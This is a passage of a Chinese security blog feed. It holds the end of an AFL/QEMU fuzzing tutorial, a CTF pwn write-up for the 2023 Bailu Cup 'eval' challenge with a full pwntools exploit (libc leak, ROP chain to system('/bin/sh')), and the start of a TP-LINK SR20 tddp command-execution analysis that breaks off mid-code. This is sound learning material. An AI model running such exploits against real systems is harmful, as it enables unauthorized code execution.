接下来遇到的问题是其默认使用的是python 需求是python2<br>所以还需要加一个软连接 使python可以指向python2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python2.7 /usr/bin/python</span><br></pre></td></tr></table></figure><p>随后虽然可以正常执行一段时间 最后还是遇到了一个报错<br><strong>&#x2F;home&#x2F;chen&#x2F;AFL&#x2F;qemu_mode&#x2F;qemu-2.10.0&#x2F;linux-user&#x2F;syscall.c:261:16: error: static declaration of ‘gettid’ follows non-static declaration</strong><br>找到qemu-mode中的patches目录 更改syscall.diff文件内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--- qemu-2.10.0-clean/linux-user/syscall.c    2020-03-12 18:47:47.898592169 +0100</span><br><span class="line">+++ qemu-2.10.0/linux-user/syscall.c    2020-03-12 19:16:41.563074307 +0100</span><br><span class="line">@@ -34,6 +34,7 @@</span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line">@@ -116,6 +117,8 @@ int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line">+extern unsigned int afl_forksrv_pid;</span><br><span class="line">+</span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line">@@ -256,7 +259,9 @@ static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line">-_syscall0(int, gettid)</span><br><span class="line">+// taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+#define __NR_sys_gettid __NR_gettid</span><br><span class="line">+_syscall0(int, sys_gettid)</span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line">@@ -6219,7 +6224,8 @@ static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">-    info-&gt;tid = gettid();</span><br><span class="line">+    // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+    info-&gt;tid = sys_gettid();</span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line">@@ -6363,9 +6369,11 @@ static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), child_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), child_tidptr);</span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), parent_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), parent_tidptr);</span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line">@@ -11402,7 +11410,8 @@ abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line">-        ret = get_errno(gettid());</span><br><span class="line">+        // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+        ret = get_errno(sys_gettid());</span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>随后成功完成环境配置<br>更多报错可以参考该文章: <a href="https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&spm=3001.4430">https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&amp;spm=3001.4430</a><br>但是随后我们尝试使用-Q选项开始模糊测试 但是发现其找不到afl-qemu-trace<br>只需要添加环境变量AFL_PATH为afl目录的路径即可<br>这里还是使用上述的PUT进行测试 不过是用gcc将其编译<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" alt="image.png"></a><br>成功获取到两个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" alt="image.png"></a><br>不出所料 一个应该是canary导致的栈溢出 一个是因为我们既定的字符串触发的crash<br>接下来试着研究了下PUT输入样例的两个方式<br>一种是直接从stdin输入 像本篇文章一直使用的PUT那样<br>还有一种是从文件中输入 那么接下来就重写一个PUT来实现第二种<br>不过我们先来搞清楚第一种<br>官方文档中 记录的指令是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</span><br></pre></td></tr></table></figure><p>[params]比较让我在意  这是否意味着不需要in目录? 可以直接从命令行输入测试样例<br>删除了in目录中的所有测试样例后 我想通过命令行向其传输aaa这个测试样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" alt="image.png"></a><br>结果还是失败了 那么为了验证 命令行输入的测试样例究竟是否起到了作用 接下来做一个小测试<br>第一组我们的测试样例中不包含aaa 同时不通过命令行输入测试样例<br>第二组我们的测试样例保持不变 通过命令行输入测试样例aaa<br>对比两组的测试结果 如果第二组的crash除了栈溢出之外 还变异出了aaa 而第一组没有 那么就可以证明测试样例成功输入进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" alt="image.png"></a><br>测试样例两个 内容分别如上图<br>第一组跑出的crash中不含有aaaa<br>第二组含有 那么可以证实测试样例确实是传入了<br>接下来研究一下从文件中写入的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd = open(&quot;flag&quot;,0);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(fd,buf,0x20);</span><br><span class="line">    char buf1[0x20] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        puts(&quot;success!&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        puts(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令 这里考虑到了canary带来的crash太讨厌了  所以直接关掉了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-gcc -o test1 -no-pie -fno-stack-protector -g ./test1.c</span><br></pre></td></tr></table></figure><p>本次提供给模糊器的测试样例就一个aaa<br>然后由于是从文件读取输入 并且你可以看到上面的代码 我们是指定了所需的文件名 同时目录应该是位于当前PUT下<br>所以我们除了使用@@标识当前使用文件输入外 还需要使用-f指定对应路径下的文件名<br>不过我试了下 把@@删了也是可以的 可能是-f就自动默认了?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out -f ./flag ./test1 @@</span><br></pre></td></tr></table></figure><p>成功找到一个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" alt="image.png"></a><br>查看了内容 没错是我们预设的aaaa</p><h1 id="fuzz实际利用"><a href="#fuzz实际利用" class="headerlink" title="fuzz实际利用"></a>fuzz实际利用</h1><p>接下来准备尝试 使用fuzz来对一些开源的知名项目进行测试 以此来熟悉fuzz实际利用的操作<br>这里使用upx upx是一款可执行文件压缩工具 <a href="https://github.com/upx/upx#">https://github.com/upx/upx#</a><br>upx使用的压缩算法涉及到了ucl 所以还要先安装ucl</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir fuzz-upx</span><br><span class="line">git clone https://github.com/upx/upx.git</span><br><span class="line">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz</span><br><span class="line">tar zxvf ucl-1.03.tar.gz</span><br><span class="line">cd ucl-1.03</span><br><span class="line">./configure CPPFLAGS=&quot;$CPPFLAGS -std=c90 -fPIC&quot;</span><br><span class="line"></span><br><span class="line">cd upx</span><br><span class="line">export CC=/usr/local/bin/afl-gcc </span><br><span class="line">export CXX=/usr/local/bin/afl-g++</span><br><span class="line">export UPX_UCCLDIR=&quot;/home/chen/fuzz-upx/ucl-1.03&quot;</span><br><span class="line">export UPX_LZMADIR=&quot;/home/chen/fuzz-upx/upx/vendor/lzma-sdk/&quot;</span><br><span class="line">上面这一步要注意一下  upx高版本和低版本的lzma-sdk存放位置不同 我的指令是高版本的</span><br><span class="line">make all</span><br><span class="line"></span><br><span class="line">在.bashrc文件中加上</span><br><span class="line">export PATH=$PATH:/home/chen/fuzz-upx/upx/build/release</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>在开始对upx模糊测试之前 我们不能像之前一样随便给几个样本 样本收集对于fuzz来说至关重要</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <id>http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</id>
    <published>2023-10-13T12:07:16.000Z</published>
    <updated>2024-09-20T09:16:23.511Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力<br>我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审</p><p>同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题</p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  while ( recv_data(v5, 0x100uLL) )</span><br><span class="line">    vuln(v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环<br>先跟进一下recv_data这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !check_opt(buf) &amp;&amp; !check_number(buf) )</span><br><span class="line">      error();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中<br>随后来看一下vuln函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall vuln(__int64 buf, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 buf2; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  buf2 = buf;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(buf + i);</span><br><span class="line">    if ( !check_opt(v3) )                       // 如果不是opt就返回0 即退出for循环</span><br><span class="line">      break;</span><br><span class="line">    deal_number(a2, buf2, i + buf);</span><br><span class="line">    if ( !check_number(*(i + 1 + buf)) )</span><br><span class="line">      error();</span><br><span class="line">    sub_CB1(a2, v3);</span><br><span class="line">    buf2 = i + 1 + buf;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  deal_number(a2, buf2, i + buf);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    calc(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑稍微复杂一点<br>仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数<br>来跟进一下deal_number函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  char old_opt; // [rsp+27h] [rbp-9h]</span><br><span class="line">  _BYTE *first_number; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *buf2 == &#x27;0&#x27; )</span><br><span class="line">    error();</span><br><span class="line">  old_opt = *opt;</span><br><span class="line">  *opt = 0;</span><br><span class="line">  first_number = strtol(buf2, 0LL, 10);</span><br><span class="line">  result = opt;</span><br><span class="line">  *opt = old_opt;</span><br><span class="line">  if ( first_number )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(a1 + 24);</span><br><span class="line">    *(a1 + 24) = v4 + 1;</span><br><span class="line">    v5 = v4 + 4;</span><br><span class="line">    result = first_number;</span><br><span class="line">    *(a1 + 8 * v5) = first_number;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断了是否为0 是则终止程序<br>随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了  所以数字存储的地址也会相应增加一个字长<br>sub_cb1函数是一个对于运算符的检查以及筛分后运算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_CB1(_QWORD *a1, char opt)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (*a1)++;</span><br><span class="line">    *(a1 + result + 8) = opt;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( opt != &#x27;+&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( opt &lt;= &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )                         // 这边是*的跳转</span><br><span class="line">LABEL_16:</span><br><span class="line">        error();</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( opt != &#x27;-&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;/&#x27; )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">LABEL_8:</span><br><span class="line">      if ( sub_91A(*(a1 + *a1 + 7)) )           // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/</span><br><span class="line">        calc(a1);</span><br><span class="line">      if ( *a1 &gt; 0xEuLL )</span><br><span class="line">        error();</span><br><span class="line">      result = (*a1)++;</span><br><span class="line">      *(a1 + result + 8) = opt;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  calc(a1);</span><br><span class="line">  if ( *a1 &gt; 0xEuLL )</span><br><span class="line">    error();</span><br><span class="line">  result = (*a1)++;</span><br><span class="line">  *(a1 + result + 8) = opt;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_QWORD *__fastcall sub_AC7(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int opt; // eax</span><br><span class="line"></span><br><span class="line">  result = *a1;</span><br><span class="line">  if ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    opt = *(a1 + --*a1 + 8);</span><br><span class="line">    if ( opt == &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[a1[3] + 2] += a1[a1[3] + 3];           // a1[a1[3] + 2]为第一个number</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( opt &gt; &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt == &#x27;-&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[a1[3] + 2] -= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( opt != &#x27;/&#x27; )</span><br><span class="line">LABEL_15:</span><br><span class="line">          error();</span><br><span class="line">        if ( !a1[a1[3] + 3] )</span><br><span class="line">          error();</span><br><span class="line">        a1[a1[3] + 2] /= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )</span><br><span class="line">        goto LABEL_15;</span><br><span class="line">      a1[a1[3] + 2] *= a1[a1[3] + 3];</span><br><span class="line">    &#125;</span><br><span class="line">    result = a1;</span><br><span class="line">    --a1[3];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上面的分析 我们大概可以推理出这样一个大概的流程<br>比如 输入1+2<br>首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中<br>此时i自增1 也就是判断下一个字符 即+<br>+可以通过判断 此时第一次执行deal_number函数<br>而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字<br>于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32<br>随后检查下一个字符是否为数字 如果不是则终止程序<br>同时更改了buf2 使其指向2数字位于的地址<br>随后就因为第四个字节为空 此时就算真正跳出了for循环<br>此时再次执行deal_number 也就是对于第二个数字进行存储<br>随后进入calc函数执行操作<br>这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]<br>完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点<br>但是如果我们输入的是+52会怎么样<br>其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符<br>而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了<br>随后只会存储52这个数字到a2+32的位置<br>随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53<br>而最后的printf语句就是根据a2[3]来索引的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;%ld\n&quot;, a2[a2[3] + 3])</span><br></pre></td></tr></table></figure><p>所以漏洞就出现在这里 可以实现一个栈上内容的泄露<br>泄露出libc_start_main的地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" alt="image.png"></a><br>在得到了libc地址后  我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;121.12.85.23&quot;,50532)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">#context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;+52&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(&quot;\n&quot;,drop = True),10)-0x24083</span><br><span class="line"></span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;+54+&quot;+str(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = &quot;+53+&quot;+str(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">rdi_addr = libc.address + 0x0000000000023b6a</span><br><span class="line"></span><br><span class="line">payload = &quot;+52+&quot;+str(rdi_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ret_addr = rdi_addr+1</span><br><span class="line"></span><br><span class="line">payload = &quot;+51+&quot;+str(ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>TP-LINK SR20漏洞复现</title>
    <link href="http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-10-08T08:50:13.000Z</published>
    <updated>2023-10-12T15:41:41.559Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个涉及到了通信协议的洞 还是比较有趣的  以此来顺便丰富一下对于协议洞的认知<br>固件下载地址: <a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">https://www.tp-link.com/us/support/download/sr20/#Firmware</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据<br>找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件<br>是32位的arm架构<br>ida打开后没有找到main函数 通过start函数来索引到main函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // r3</span><br><span class="line">  int v4; // r0</span><br><span class="line">  int v6; // [sp+Ch] [bp-8h]</span><br><span class="line">  int v7; // [sp+Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = mem_calloc(argc, argv, envp);</span><br><span class="line">  if ( v6 )</span><br><span class="line">    return v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = delete_mem(v4);</span><br><span class="line">  if ( v7 )</span><br><span class="line">    v3 = v7;</span><br><span class="line">  else</span><br><span class="line">    v3 = 0;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间<br>重点跟进一下936c这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_936C()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // r4</span><br><span class="line">  int optval; // [sp+Ch] [bp-B0h] BYREF</span><br><span class="line">  int v3; // [sp+10h] [bp-ACh] BYREF</span><br><span class="line">  struct timeval timeout; // [sp+14h] [bp-A8h] BYREF</span><br><span class="line">  fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF</span><br><span class="line">  _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF</span><br><span class="line">  int v7; // [sp+A0h] [bp-1Ch]</span><br><span class="line">  int nfds; // [sp+A4h] [bp-18h]</span><br><span class="line">  fd_set *v9; // [sp+A8h] [bp-14h]</span><br><span class="line">  unsigned int i; // [sp+ACh] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  v3 = 1;</span><br><span class="line">  optval = 1;</span><br><span class="line">  printf(&quot;[%s():%d] tddp task start\n&quot;, &quot;tddp_taskEntry&quot;, 151);</span><br><span class="line">  if ( 